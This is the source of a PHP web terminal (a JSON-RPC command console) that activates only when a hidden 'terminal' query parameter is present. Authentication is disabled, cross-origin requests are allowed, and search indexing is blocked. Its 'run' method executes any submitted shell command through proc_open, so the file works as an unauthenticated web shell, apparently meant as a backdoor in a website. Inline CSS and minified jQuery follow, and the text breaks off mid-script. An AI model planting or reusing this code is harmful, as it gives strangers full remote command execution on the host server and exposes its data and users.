
<?php if (isset($_GET['terminal'])) { $NO_LOGIN = true;
 $USER = '';
 $PASSWORD = '';
 $ACCOUNTS = array();
 $PASSWORD_HASH_ALGORITHM = '';
 $HOME_DIRECTORY = '';
 
?>

<?php class BaseJsonRpcServer { const ParseError = -32700, InvalidRequest = -32600, MethodNotFound = -32601, InvalidParams = -32602, InternalError = -32603;
 protected $instances = array();
 protected $request;
 protected $calls = array();
 protected $response = array();
 protected $hasCalls = false;
 private $isBatchCall = false;
 protected $hiddenMethods = array( 'execute', '__construct', 'registerinstance' );
 public $ContentType = 'application/json';
 public $IsXDR = true;
 public $MaxBatchCalls = 10;
 protected $errorMessages = array( self::ParseError => 'Parse error', self::InvalidRequest => 'Invalid Request', self::MethodNotFound => 'Method not found', self::InvalidParams => 'Invalid params', self::InternalError => 'Internal error', );
 private $reflectionMethods = array();
 private function getRequest() { $error = null;
 do { if ( array_key_exists( 'REQUEST_METHOD', $_SERVER ) && $_SERVER['REQUEST_METHOD'] != 'POST' ) { $error = self::InvalidRequest;
 break;
 };
 $request = !empty( $_GET['rawRequest'] ) ? $_GET['rawRequest'] : file_get_contents( 'php://input' );
 $this->request = json_decode( $request, false );
 if ( $this->request === null ) { $error = self::ParseError;
 break;
 } if ( $this->request === array() ) { $error = self::InvalidRequest;
 break;
 } if ( is_array( $this->request ) ) { if( count( $this->request ) > $this->MaxBatchCalls ) { $error = self::InvalidRequest;
 break;
 } $this->calls = $this->request;
 $this->isBatchCall = true;
 } else { $this->calls[] = $this->request;
 } } while ( false );
 return $error;
 } private function getError( $code, $id = null, $data = null ) { return array( 'jsonrpc' => '2.0', 'id' => $id, 'error' => array( 'code' => $code, 'message' => isset( $this->errorMessages[$code] ) ? $this->errorMessages[$code] : $this->errorMessages[self::InternalError], 'data' => $data, ), );
 } private function validateCall( $call ) { $result = null;
 $error = null;
 $data = null;
 $id = is_object( $call ) && property_exists( $call, 'id' ) ? $call->id : null;
 do { if ( !is_object( $call ) ) { $error = self::InvalidRequest;
 break;
 } if ( property_exists( $call, 'version' ) ) { if ( $call->version == 'json-rpc-2.0' ) { $call->jsonrpc = '2.0';
 } } if ( !property_exists( $call, 'jsonrpc' ) || $call->jsonrpc != '2.0' ) { $error = self::InvalidRequest;
 break;
 } $fullMethod = property_exists( $call, 'method' ) ? $call->method : '';
 $methodInfo = explode( '.', $fullMethod, 2 );
 $namespace = array_key_exists( 1, $methodInfo ) ? $methodInfo[0] : '';
 $method = $namespace ? $methodInfo[1] : $fullMethod;
 if ( !$method || !array_key_exists( $namespace, $this->instances ) || !method_exists( $this->instances[$namespace], $method ) || in_array( strtolower( $method ), $this->hiddenMethods ) ) { $error = self::MethodNotFound;
 break;
 } if ( !array_key_exists( $fullMethod, $this->reflectionMethods ) ) { $this->reflectionMethods[$fullMethod] = new ReflectionMethod( $this->instances[$namespace], $method );
 } $params = property_exists( $call, 'params' ) ? $call->params : null;
 $paramsType = gettype( $params );
 if ( $params !== null && $paramsType != 'array' && $paramsType != 'object' ) { $error = self::InvalidParams;
 break;
 } switch ( $paramsType ) { case 'array': $totalRequired = 0;
 foreach ( $this->reflectionMethods[$fullMethod]->getParameters() as $param ) { if ( !$param->isDefaultValueAvailable() ) { $totalRequired++;
 } } if ( count( $params ) < $totalRequired ) { $error = self::InvalidParams;
 $data = sprintf( 'Check numbers of required params (got %d, expected %d)', count( $params ), $totalRequired );
 } break;
 case 'object': foreach ( $this->reflectionMethods[$fullMethod]->getParameters() as $param ) { if ( !$param->isDefaultValueAvailable() && !array_key_exists( $param->getName(), $params ) ) { $error = self::InvalidParams;
 $data = $param->getName() . ' not found';
 break 3;
 } } break;
 case 'NULL': if ( $this->reflectionMethods[$fullMethod]->getNumberOfRequiredParameters() > 0 ) { $error = self::InvalidParams;
 $data = 'Empty required params';
 break 2;
 } break;
 } } while ( false );
 if ( $error ) { $result = array( $error, $id, $data );
 } return $result;
 } private function processCall( $call ) { $id = property_exists( $call, 'id' ) ? $call->id : null;
 $params = property_exists( $call, 'params' ) ? $call->params : array();
 $result = null;
 $namespace = substr( $call->method, 0, strpos( $call->method, '.' ) );
 try { if ( is_object( $params ) ) { $newParams = array();
 foreach ( $this->reflectionMethods[$call->method]->getParameters() as $param ) { $paramName = $param->getName();
 $defaultValue = $param->isDefaultValueAvailable() ? $param->getDefaultValue() : null;
 $newParams[] = property_exists( $params, $paramName ) ? $params->$paramName : $defaultValue;
 } $params = $newParams;
 } $result = $this->reflectionMethods[$call->method]->invokeArgs( $this->instances[$namespace], $params );
 } catch ( Exception $e ) { return $this->getError( $e->getCode(), $id, $e->getMessage() );
 } if ( !$id && $id !== 0 ) { return null;
 } return array( 'jsonrpc' => '2.0', 'result' => $result, 'id' => $id, );
 } public function __construct( $instance = null ) { if ( get_parent_class( $this ) ) { $this->RegisterInstance( $this, '' );
 } else if ( $instance ) { $this->RegisterInstance( $instance, '' );
 } } public function RegisterInstance( $instance, $namespace = '' ) { $this->instances[$namespace] = $instance;
 $this->instances[$namespace]->errorMessages = $this->errorMessages;
 return $this;
 } public function Execute() { do { if ( array_key_exists( 'smd', $_GET ) ) { $this->response[] = $this->getServiceMap();
 $this->hasCalls = true;
 break;
 } $error = $this->getRequest();
 if ( $error ) { $this->response[] = $this->getError( $error );
 $this->hasCalls = true;
 break;
 } foreach ( $this->calls as $call ) { $error = $this->validateCall( $call );
 if ( $error ) { $this->response[] = $this->getError( $error[0], $error[1], $error[2] );
 $this->hasCalls = true;
 } else { $result = $this->processCall( $call );
 if ( $result ) { $this->response[] = $result;
 $this->hasCalls = true;
 } } } } while ( false );
 if ( $this->hasCalls ) { if ( !$this->isBatchCall ) { $this->response = reset( $this->response );
 } if ( !headers_sent() ) { if ( $this->ContentType ) { header( 'Content-Type: ' . $this->ContentType );
 } if ( $this->IsXDR ) { header( 'Access-Control-Allow-Origin: *' );
 header( 'Access-Control-Allow-Headers: x-requested-with, content-type' );
 } } echo json_encode( $this->response );
 $this->resetVars();
 } } private function getDocDescription( $comment ) { $result = null;
 if ( preg_match( '/\*\s+([^@]*)\s+/s', $comment, $matches ) ) { $result = str_replace( '*', "\n", trim( trim( $matches[1], '*' ) ) );
 } return $result;
 } private function getServiceMap() { $result = array( 'transport' => 'POST', 'envelope' => 'JSON-RPC-2.0', 'SMDVersion' => '2.0', 'contentType' => 'application/json', 'target' => !empty( $_SERVER['REQUEST_URI'] ) ? substr( $_SERVER['REQUEST_URI'], 0, strpos( $_SERVER['REQUEST_URI'], '?' ) ) : '', 'services' => array(), 'description' => '', );
 foreach( $this->instances as $namespace => $instance ) { $rc = new ReflectionClass( $instance);
 if ( $rcDocComment = $this->getDocDescription( $rc->getDocComment() ) ) { $result['description'] .= $rcDocComment . PHP_EOL;
 } foreach ( $rc->getMethods() as $method ) { if ( !$method->isPublic() || in_array( strtolower( $method->getName() ), $this->hiddenMethods ) ) { continue;
 } $methodName = ( $namespace ? $namespace . '.' : '' ) . $method->getName();
 $docComment = $method->getDocComment();
 $result['services'][$methodName] = array( 'parameters' => array() );
 if ( $rmDocComment = $this->getDocDescription( $docComment ) ) { $result['services'][$methodName]['description'] = $rmDocComment;
 } $parsedParams = array();
 if ( preg_match_all( '/@param\s+([^\s]*)\s+([^\s]*)\s*([^\n\*]*)/', $docComment, $matches ) ) { foreach ( $matches[2] as $number => $name ) { $type = $matches[1][$number];
 $desc = $matches[3][$number];
 $name = trim( $name, '$' );
 $param = array( 'type' => $type, 'description' => $desc );
 $parsedParams[$name] = array_filter( $param );
 } };
 foreach ( $method->getParameters() as $parameter ) { $name = $parameter->getName();
 $param = array( 'name' => $name, 'optional' => $parameter->isDefaultValueAvailable() );
 if ( array_key_exists( $name, $parsedParams ) ) { $param += $parsedParams[$name];
 } if ( $param['optional'] ) { $param['default'] = $parameter->getDefaultValue();
 } $result['services'][$methodName]['parameters'][] = $param;
 } if ( preg_match( '/@return\s+([^\s]+)\s*([^\n\*]+)/', $docComment, $matches ) ) { $returns = array( 'type' => $matches[1], 'description' => trim( $matches[2] ) );
 $result['services'][$methodName]['returns'] = array_filter( $returns );
 } } } return $result;
 } private function resetVars() { $this->response = $this->calls = array();
 $this->hasCalls = $this->isBatchCall = false;
 } } 
?>

<?php if (!isset($NO_LOGIN)) $NO_LOGIN = false;
 if (!isset($ACCOUNTS)) $ACCOUNTS = array();
 if (isset($USER) && isset($PASSWORD) && $USER && $PASSWORD) $ACCOUNTS[$USER] = $PASSWORD;
 if (!isset($PASSWORD_HASH_ALGORITHM)) $PASSWORD_HASH_ALGORITHM = '';
 if (!isset($HOME_DIRECTORY)) $HOME_DIRECTORY = '';
 $IS_CONFIGURED = ($NO_LOGIN || count($ACCOUNTS) >= 1) ? true : false;
 function is_empty_string($string) { return strlen($string) <= 0;
 } function is_equal_strings($string1, $string2) { return strcmp($string1, $string2) == 0;
 } function get_hash($algorithm, $string) { return hash($algorithm, trim((string) $string));
 } function execute_command($command) { $descriptors = array( 0 => array('pipe', 'r'), 1 => array('pipe', 'w'), 2 => array('pipe', 'w') );
 $process = proc_open($command . ' 2>&1', $descriptors, $pipes);
 if (!is_resource($process)) die("Can't execute command.");
 fclose($pipes[0]);
 $output = stream_get_contents($pipes[1]);
 fclose($pipes[1]);
 $error = stream_get_contents($pipes[2]);
 fclose($pipes[2]);
 $code = proc_close($process);
 return $output;
 } function parse_command($command) { $value = ltrim((string) $command);
 if (!is_empty_string($value)) { $values = explode(' ', $value);
 $values_total = count($values);
 if ($values_total > 1) { $value = $values[$values_total - 1];
 for ($index = $values_total - 2;
 $index >= 0;
 $index--) { $value_item = $values[$index];
 if (substr($value_item, -1) == '\\') $value = $value_item . ' ' . $value;
 else break;
 } } } return $value;
 } class WebConsoleRPCServer extends BaseJsonRpcServer { protected $home_directory = '';
 private function error($message) { throw new Exception($message);
 } private function authenticate_user($user, $password) { $user = trim((string) $user);
 $password = trim((string) $password);
 if ($user && $password) { global $ACCOUNTS, $PASSWORD_HASH_ALGORITHM;
 if (isset($ACCOUNTS[$user]) && !is_empty_string($ACCOUNTS[$user])) { if ($PASSWORD_HASH_ALGORITHM) $password = get_hash($PASSWORD_HASH_ALGORITHM, $password);
 if (is_equal_strings($password, $ACCOUNTS[$user])) return $user . ':' . get_hash('sha256', $password);
 } } throw new Exception("Incorrect user or password");
 } private function authenticate_token($token) { global $NO_LOGIN;
 if ($NO_LOGIN) return true;
 $token = trim((string) $token);
 $token_parts = explode(':', $token, 2);
 if (count($token_parts) == 2) { $user = trim((string) $token_parts[0]);
 $password_hash = trim((string) $token_parts[1]);
 if ($user && $password_hash) { global $ACCOUNTS;
 if (isset($ACCOUNTS[$user]) && !is_empty_string($ACCOUNTS[$user])) { $real_password_hash = get_hash('sha256', $ACCOUNTS[$user]);
 if (is_equal_strings($password_hash, $real_password_hash)) return $user;
 } } } throw new Exception("Incorrect user or password");
 } private function get_home_directory($user) { global $HOME_DIRECTORY;
 if (is_string($HOME_DIRECTORY)) { if (!is_empty_string($HOME_DIRECTORY)) return $HOME_DIRECTORY;
 } else if (is_string($user) && !is_empty_string($user) && isset($HOME_DIRECTORY[$user]) && !is_empty_string($HOME_DIRECTORY[$user])) return $HOME_DIRECTORY[$user];
 return getcwd();
 } private function get_environment() { $hostname = function_exists('gethostname') ? gethostname() : null;
 return array('path' => getcwd(), 'hostname' => $hostname);
 } private function set_environment($environment) { $environment = !empty($environment) ? (array) $environment : array();
 $path = (isset($environment['path']) && !is_empty_string($environment['path'])) ? $environment['path'] : $this->home_directory;
 if (!is_empty_string($path)) { if (is_dir($path)) { if (!@chdir($path)) return array('output' => "Unable to change directory to current working directory, updating current directory", 'environment' => $this->get_environment());
 } else return array('output' => "Current working directory not found, updating current directory", 'environment' => $this->get_environment());
 } } private function initialize($token, $environment) { $user = $this->authenticate_token($token);
 $this->home_directory = $this->get_home_directory($user);
 $result = $this->set_environment($environment);
 if ($result) return $result;
 } public function login($user, $password) { $result = array('token' => $this->authenticate_user($user, $password), 'environment' => $this->get_environment());
 $home_directory = $this->get_home_directory($user);
 if (!is_empty_string($home_directory)) { if (is_dir($home_directory)) $result['environment']['path'] = $home_directory;
 else $result['output'] = "Home directory not found: ". $home_directory;
 } return $result;
 } public function cd($token, $environment, $path) { $result = $this->initialize($token, $environment);
 if ($result) return $result;
 $path = trim((string) $path);
 if (is_empty_string($path)) $path = $this->home_directory;
 if (!is_empty_string($path)) { if (is_dir($path)) { if (!@chdir($path)) return array('output' => "cd: ". $path . ": Unable to change directory");
 } else return array('output' => "cd: ". $path . ": No such directory");
 } return array('environment' => $this->get_environment());
 } public function completion($token, $environment, $pattern, $command) { $result = $this->initialize($token, $environment);
 if ($result) return $result;
 $scan_path = '';
 $completion_prefix = '';
 $completion = array();
 if (!empty($pattern)) { if (!is_dir($pattern)) { $pattern = dirname($pattern);
 if ($pattern == '.') $pattern = '';
 } if (!empty($pattern)) { if (is_dir($pattern)) { $scan_path = $completion_prefix = $pattern;
 if (substr($completion_prefix, -1) != '/') $completion_prefix .= '/';
 } } else $scan_path = getcwd();
 } else $scan_path = getcwd();
 if (!empty($scan_path)) { $completion = array_values(array_diff(scandir($scan_path), array('..', '.')));
 natsort($completion);
 if (!empty($completion_prefix) && !empty($completion)) { foreach ($completion as &$value) $value = $completion_prefix . $value;
 } if (!empty($pattern) && !empty($completion)) { function filter_pattern($value) { global $pattern;
 return !strncmp($pattern, $value, strlen($pattern));
 } $completion = array_values(array_filter($completion, 'filter_pattern'));
 } } return array('completion' => $completion);
 } public function run($token, $environment, $command) { $result = $this->initialize($token, $environment);
 if ($result) return $result;
 $output = ($command && !is_empty_string($command)) ? execute_command($command) : '';
 if ($output && substr($output, -1) == "\n") $output = substr($output, 0, -1);
 return array('output' => $output);
 } } if (array_key_exists('REQUEST_METHOD', $_SERVER) && $_SERVER['REQUEST_METHOD'] == 'POST') { $rpc_server = new WebConsoleRPCServer();
 $rpc_server->Execute();
 } else {
?>
<!DOCTYPE html>
<html class="no-js">
 <head>
 <meta charset="utf-8" />
 <meta http-equiv="X-UA-Compatible" content="IE=edge" />
 <title>Terminal</title>
 <link rel="icon" href="http://www.omgubuntu.co.uk/wp-content/uploads/2016/09/terminal-icon.png" type="image/png">
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <meta name="robots" content="none" />
 <style type="text/css">html{font-family:sans-serif;
line-height:1.15;
-ms-text-size-adjust:100%;
-webkit-text-size-adjust:100%}body{margin:0}article,aside,footer,header,nav,section{display:block}h1{font-size:2em;
margin:.67em 0}figcaption,figure,main{display:block}figure{margin:1em 40px}hr{box-sizing:content-box;
height:0;
overflow:visible}pre{font-family:monospace,monospace;
font-size:1em}a{background-color:transparent;
-webkit-text-decoration-skip:objects}a:active,a:hover{outline-width:0}abbr[title]{border-bottom:0;
text-decoration:underline;
text-decoration:underline dotted}b,strong{font-weight:bolder}code,kbd,samp{font-family:monospace,monospace;
font-size:1em}dfn{font-style:italic}mark{background-color:#ff0;
color:#000}small{font-size:80%}sub,sup{font-size:75%;
line-height:0;
position:relative;
vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}audio,video{display:inline-block}audio:not([controls]){display:none;
height:0}img{border-style:none}svg:not(:root){overflow:hidden}button,input,optgroup,select,textarea{font-family:sans-serif;
font-size:100%;
line-height:1.15;
margin:0}button,input{overflow:visible}button,select{text-transform:none}[type=reset],[type=submit],button,html [type=button]{-webkit-appearance:button}[type=button]::-moz-focus-inner,[type=reset]::-moz-focus-inner,[type=submit]::-moz-focus-inner,button::-moz-focus-inner{border-style:none;
padding:0}[type=button]:-moz-focusring,[type=reset]:-moz-focusring,[type=submit]:-moz-focusring,button:-moz-focusring{outline:1px dotted ButtonText}fieldset{border:1px solid silver;
margin:0 2px;
padding:.35em .625em .75em}legend{box-sizing:border-box;
color:inherit;
display:table;
max-width:100%;
padding:0;
white-space:normal}progress{display:inline-block;
vertical-align:baseline}textarea{overflow:auto}[type=checkbox],[type=radio]{box-sizing:border-box;
padding:0}[type=number]::-webkit-inner-spin-button,[type=number]::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;
outline-offset:-2px}[type=search]::-webkit-search-cancel-button,[type=search]::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;
font:inherit}details,menu{display:block}summary{display:list-item}canvas{display:inline-block}[hidden],template{display:none}.cmd .format,.cmd .prompt,.cmd .prompt div,.terminal .terminal-output .format,.terminal .terminal-output div div{display:inline-block}.cmd,.terminal h1,.terminal h2,.terminal h3,.terminal h4,.terminal h5,.terminal h6,.terminal pre{margin:0}.terminal h1,.terminal h2,.terminal h3,.terminal h4,.terminal h5,.terminal h6{line-height:1.2em}.cmd .clipboard{position:absolute;
left:-16px;
top:0;
width:10px;
height:16px;
background:0 0;
border:0;
color:transparent;
outline:0;
padding:0;
resize:none;
z-index:0;
overflow:hidden}.terminal .error{color:red}.terminal{padding:10px;
position:relative;
overflow:auto}.cmd{padding:0;
height:1.3em;
position:relative}.cmd .cursor.blink,.cmd .inverted,.terminal .inverted{background-color:#aaa;
color:#000}.cmd .cursor.blink{-webkit-animation:terminal-blink 1s infinite steps(1,start);
-moz-animation:terminal-blink 1s infinite steps(1,start);
-ms-animation:terminal-blink 1s infinite steps(1,start);
animation:terminal-blink 1s infinite steps(1,start)}@-webkit-keyframes terminal-blink{0%,100%{background-color:#000;
color:#aaa}50%{background-color:#bbb;
color:#000}}@-ms-keyframes terminal-blink{0%,100%{background-color:#000;
color:#aaa}50%{background-color:#bbb;
color:#000}}@-moz-keyframes terminal-blink{0%,100%{background-color:#000;
color:#aaa}50%{background-color:#bbb;
color:#000}}@keyframes terminal-blink{0%,100%{background-color:#000;
color:#aaa}50%{background-color:#bbb;
color:#000}}.cmd .prompt,.terminal .terminal-output div div{display:block;
line-height:14px;
height:auto}.cmd .prompt{float:left}.cmd,.terminal{background-color:#000}.terminal-output>div{min-height:14px}.terminal-output>div>div *{word-wrap:break-word}.terminal .terminal-output div span{display:inline-block}.cmd span{float:left}.cmd div,.cmd span,.terminal h1,.terminal h2,.terminal h3,.terminal h4,.terminal h5,.terminal h6,.terminal pre,.terminal td,.terminal-output a,.terminal-output span{-webkit-touch-callout:initial;
-webkit-user-select:initial;
-khtml-user-select:initial;
-moz-user-select:initial;
-ms-user-select:initial;
user-select:initial}.terminal,.terminal-output,.terminal-output div{-webkit-touch-callout:none;
-webkit-user-select:none;
-khtml-user-select:none;
-moz-user-select:none;
-ms-user-select:none;
user-select:none}@-moz-document url-prefix(){.terminal,.terminal-output,.terminal-output div{-webkit-touch-callout:initial;
-webkit-user-select:initial;
-khtml-user-select:initial;
-moz-user-select:initial;
-ms-user-select:initial;
user-select:initial}}.terminal table{border-collapse:collapse}.terminal td{border:1px solid #aaa}.cmd .prompt span::-moz-selection,.cmd div::-moz-selection,.cmd>span::-moz-selection,.terminal .terminal-output div div a::-moz-selection,.terminal .terminal-output div div::-moz-selection,.terminal .terminal-output div span::-moz-selection,.terminal h1::-moz-selection,.terminal h2::-moz-selection,.terminal h3::-moz-selection,.terminal h4::-moz-selection,.terminal h5::-moz-selection,.terminal h6::-moz-selection,.terminal pre::-moz-selection,.terminal td::-moz-selection{background-color:#aaa;
color:#000}.cmd .prompt span::selection,.cmd div::selection,.cmd>span::selection,.terminal .terminal-output div div a::selection,.terminal .terminal-output div div::selection,.terminal .terminal-output div span::selection,.terminal h1::selection,.terminal h2::selection,.terminal h3::selection,.terminal h4::selection,.terminal h5::selection,.terminal h6::selection,.terminal pre::selection,.terminal td::selection{background-color:#aaa;
color:#000}.terminal .terminal-output div.error,.terminal .terminal-output div.error div{color:red}.tilda{position:fixed;
top:0;
left:0;
width:100%;
z-index:1100}.clear{clear:both}body{background-color:#000}.cmd,.terminal,.terminal .prompt,.terminal .terminal-output div div,body{color:#ccc;
font-family:monospace,fixed;
font-size:15px;
line-height:18px}.terminal a,.terminal a:hover,a,a:hover{color:#6c71c4}.spaced{margin:15px 0}.spaced-top{margin:15px 0 0}.spaced-bottom{margin:0 0 15px}.configure{margin:20px}.configure .variable{color:#d33682}.configure p,.configure ul{margin:5px 0 0}</style>

 <script type="text/javascript">!function(a,b){function c(a){return K.isWindow(a)?a:9===a.nodeType?a.defaultView||a.parentWindow:!1}function d(a){if(!tb[a]){var b=H.body,c=K("<"+a+">").appendTo(b),d=c.css("display");
c.remove(),("none"===d||""===d)&&(pb||(pb=H.createElement("iframe"),pb.frameBorder=pb.width=pb.height=0),b.appendChild(pb),qb&&pb.createElement||(qb=(pb.contentWindow||pb.contentDocument).document,qb.write(("CSS1Compat"===H.compatMode?"<!doctype html>":"")+"<html><body>"),qb.close()),c=qb.createElement(a),qb.body.appendChild(c),d=K.css(c,"display"),b.removeChild(pb)),tb[a]=d}return tb[a]}function e(a,b){var c={};
return K.each(wb.concat.apply([],wb.slice(0,b)),function(){c[this]=a}),c}function f(){sb=b}function g(){return setTimeout(f,0),sb=K.now()}function h(){try{return new a.ActiveXObject("Microsoft.XMLHTTP")}catch(b){}}function i(){try{return new a.XMLHttpRequest}catch(b){}}function j(a,c){a.dataFilter&&(c=a.dataFilter(c,a.dataType));
var d,e,f,g,h,i,j,k,l=a.dataTypes,m={},n=l.length,o=l[0];
for(d=1;
n>d;
d++){if(1===d)for(e in a.converters)"string"==typeof e&&(m[e.toLowerCase()]=a.converters[e]);
if(g=o,o=l[d],"*"===o)o=g;
else if("*"!==g&&g!==o){if(h=g+" "+o,i=m[h]||m["* "+o],!i){k=b;
for(j in m)if(f=j.split(" "),(f[0]===g||"*"===f[0])&&(k=m[f[1]+" "+o])){j=m[j],j===!0?i=k:k===!0&&(i=j);
break}}!i&&!k&&K.error("No conversion from "+h.replace(" "," to ")),i!==!0&&(c=i?i(c):k(j(c)))}}return c}function k(a,c,d){var e,f,g,h,i=a.contents,j=a.dataTypes,k=a.responseFields;
for(f in k)f in d&&(c[k[f]]=d[f]);
for(;
"*"===j[0];
)j.shift(),e===b&&(e=a.mimeType||c.getResponseHeader("content-type"));
if(e)for(f in i)if(i[f]&&i[f].test(e)){j.unshift(f);
break}if(j[0]in d)g=j[0];
else{for(f in d){if(!j[0]||a.converters[f+" "+j[0]]){g=f;
break}h||(h=f)}g=g||h}return g?(g!==j[0]&&j.unshift(g),d[g]):void 0}function l(a,b,c,d){if(K.isArray(b))K.each(b,function(b,e){c||Ta.test(a)?d(a,e):l(a+"["+("object"==typeof e||K.isArray(e)?b:"")+"]",e,c,d)});
else if(c||null==b||"object"!=typeof b)d(a,b);
else for(var e in b)l(a+"["+e+"]",b[e],c,d)}function m(a,c){var d,e,f=K.ajaxSettings.flatOptions||{};
for(d in c)c[d]!==b&&((f[d]?a:e||(e={}))[d]=c[d]);
e&&K.extend(!0,a,e)}function n(a,c,d,e,f,g){f=f||c.dataTypes[0],g=g||{},g[f]=!0;
for(var h,i=a[f],j=0,k=i?i.length:0,l=a===gb;
k>j&&(l||!h);
j++)h=i[j](c,d,e),"string"==typeof h&&(!l||g[h]?h=b:(c.dataTypes.unshift(h),h=n(a,c,d,e,h,g)));
return(l||!h)&&!g["*"]&&(h=n(a,c,d,e,"*",g)),h}function o(a){return function(b,c){if("string"!=typeof b&&(c=b,b="*"),K.isFunction(c))for(var d,e,f,g=b.toLowerCase().split(cb),h=0,i=g.length;
i>h;
h++)d=g[h],f=/^\+/.test(d),f&&(d=d.substr(1)||"*"),e=a[d]=a[d]||[],e[f?"unshift":"push"](c)}}function p(a,b,c){var d="width"===b?a.offsetWidth:a.offsetHeight,e="width"===b?Oa:Pa,f=0,g=e.length;
if(d>0){if("border"!==c)for(;
g>f;
f++)c||(d-=parseFloat(K.css(a,"padding"+e[f]))||0),"margin"===c?d+=parseFloat(K.css(a,c+e[f]))||0:d-=parseFloat(K.css(a,"border"+e[f]+"Width"))||0;
return d+"px"}if(d=Ea(a,b,b),(0>d||null==d)&&(d=a.style[b]||0),d=parseFloat(d)||0,c)for(;
g>f;
f++)d+=parseFloat(K.css(a,"padding"+e[f]))||0,"padding"!==c&&(d+=parseFloat(K.css(a,"border"+e[f]+"Width"))||0),"margin"===c&&(d+=parseFloat(K.css(a,c+e[f]))||0);
return d+"px"}function q(a,b){b.src?K.ajax({url:b.src,async:!1,dataType:"script"}):K.globalEval((b.text||b.textContent||b.innerHTML||"").replace(Ba,"/*$0*/")),b.parentNode&&b.parentNode.removeChild(b)}function r(a){var b=H.createElement("div");
return Da.appendChild(b),b.innerHTML=a.outerHTML,b.firstChild}function s(a){var b=(a.nodeName||"").toLowerCase();
"input"===b?t(a):"script"!==b&&"undefined"!=typeof a.getElementsByTagName&&K.grep(a.getElementsByTagName("input"),t)}function t(a){("checkbox"===a.type||"radio"===a.type)&&(a.defaultChecked=a.checked)}function u(a){return"undefined"!=typeof a.getElementsByTagName?a.getElementsByTagName("*"):"undefined"!=typeof a.querySelectorAll?a.querySelectorAll("*"):[]}function v(a,b){var c;
1===b.nodeType&&(b.clearAttributes&&b.clearAttributes(),b.mergeAttributes&&b.mergeAttributes(a),c=b.nodeName.toLowerCase(),"object"===c?b.outerHTML=a.outerHTML:"input"!==c||"checkbox"!==a.type&&"radio"!==a.type?"option"===c?b.selected=a.defaultSelected:("input"===c||"textarea"===c)&&(b.defaultValue=a.defaultValue):(a.checked&&(b.defaultChecked=b.checked=a.checked),b.value!==a.value&&(b.value=a.value)),b.removeAttribute(K.expando))}function w(a,b){if(1===b.nodeType&&K.hasData(a)){var c,d,e,f=K._data(a),g=K._data(b,f),h=f.events;
if(h){delete g.handle,g.events={};
for(c in h)for(d=0,e=h[c].length;
e>d;
d++)K.event.add(b,c+(h[c][d].namespace?".":"")+h[c][d].namespace,h[c][d],h[c][d].data)}g.data&&(g.data=K.extend({},g.data))}}function x(a,b){return K.nodeName(a,"table")?a.getElementsByTagName("tbody")[0]||a.appendChild(a.ownerDocument.createElement("tbody")):a}function y(a){var b=pa.split("|"),c=a.createDocumentFragment();
if(c.createElement)for(;
b.length;
)c.createElement(b.pop());
return c}function z(a,b,c){if(b=b||0,K.isFunction(b))return K.grep(a,function(a,d){var e=!!b.call(a,d,a);
return e===c});
if(b.nodeType)return K.grep(a,function(a,d){return a===b===c});
if("string"==typeof b){var d=K.grep(a,function(a){return 1===a.nodeType});
if(la.test(b))return K.filter(b,d,!c);
b=K.filter(b,d)}return K.grep(a,function(a,d){return K.inArray(a,b)>=0===c})}function A(a){return!a||!a.parentNode||11===a.parentNode.nodeType}function B(){return!0}function C(){return!1}function D(a,b,c){var d=b+"defer",e=b+"queue",f=b+"mark",g=K._data(a,d);
g&&("queue"===c||!K._data(a,e))&&("mark"===c||!K._data(a,f))&&setTimeout(function(){!K._data(a,e)&&!K._data(a,f)&&(K.removeData(a,d,!0),g.fire())},0)}function E(a){for(var b in a)if(("data"!==b||!K.isEmptyObject(a[b]))&&"toJSON"!==b)return!1;
return!0}function F(a,c,d){if(d===b&&1===a.nodeType){var e="data-"+c.replace(O,"-$1").toLowerCase();
if(d=a.getAttribute(e),"string"==typeof d){try{d="true"===d?!0:"false"===d?!1:"null"===d?null:K.isNumeric(d)?parseFloat(d):N.test(d)?K.parseJSON(d):d}catch(f){}K.data(a,c,d)}else d=b}return d}function G(a){var b,c,d=L[a]={};
for(a=a.split(/\s+/),b=0,c=a.length;
c>b;
b++)d[a[b]]=!0;
return d}var H=a.document,I=a.navigator,J=a.location,K=function(){function c(){if(!h.isReady){try{H.documentElement.doScroll("left")}catch(a){return void setTimeout(c,1)}h.ready()}}var d,e,f,g,h=function(a,b){return new h.fn.init(a,b,d)},i=a.jQuery,j=a.$,k=/^(?:[^#<]*(<[\w\W]+>)[^>]*$|#([\w\-]*)$)/,l=/\S/,m=/^\s+/,n=/\s+$/,o=/^<(\w+)\s*\/
?>(?:<\/\1>)?$/,p=/^[\],:{}\s]*$/,q=/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g,r=/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g,s=/(?:^|:|,)(?:\s*\[)+/g,t=/(webkit)[ \/]([\w.]+)/,u=/(opera)(?:.*version)?[ \/]([\w.]+)/,v=/(msie) ([\w.]+)/,w=/(mozilla)(?:.*? rv:([\w.]+))?/,x=/-([a-z]|[0-9])/gi,y=/^-ms-/,z=function(a,b){return(b+"").toUpperCase()},A=I.userAgent,B=Object.prototype.toString,C=Object.prototype.hasOwnProperty,D=Array.prototype.push,E=Array.prototype.slice,F=String.prototype.trim,G=Array.prototype.indexOf,J={};
return h.fn=h.prototype={constructor:h,init:function(a,c,d){var e,f,g,i;
if(!a)return this;
if(a.nodeType)return this.context=this[0]=a,this.length=1,this;
if("body"===a&&!c&&H.body)return this.context=H,this[0]=H.body,this.selector=a,this.length=1,this;
if("string"==typeof a){if(e="<"!==a.charAt(0)||">"!==a.charAt(a.length-1)||a.length<3?k.exec(a):[null,a,null],e&&(e[1]||!c)){if(e[1])return c=c instanceof h?c[0]:c,i=c?c.ownerDocument||c:H,g=o.exec(a),g?h.isPlainObject(c)?(a=[H.createElement(g[1])],h.fn.attr.call(a,c,!0)):a=[i.createElement(g[1])]:(g=h.buildFragment([e[1]],[i]),a=(g.cacheable?h.clone(g.fragment):g.fragment).childNodes),h.merge(this,a);
if(f=H.getElementById(e[2]),f&&f.parentNode){if(f.id!==e[2])return d.find(a);
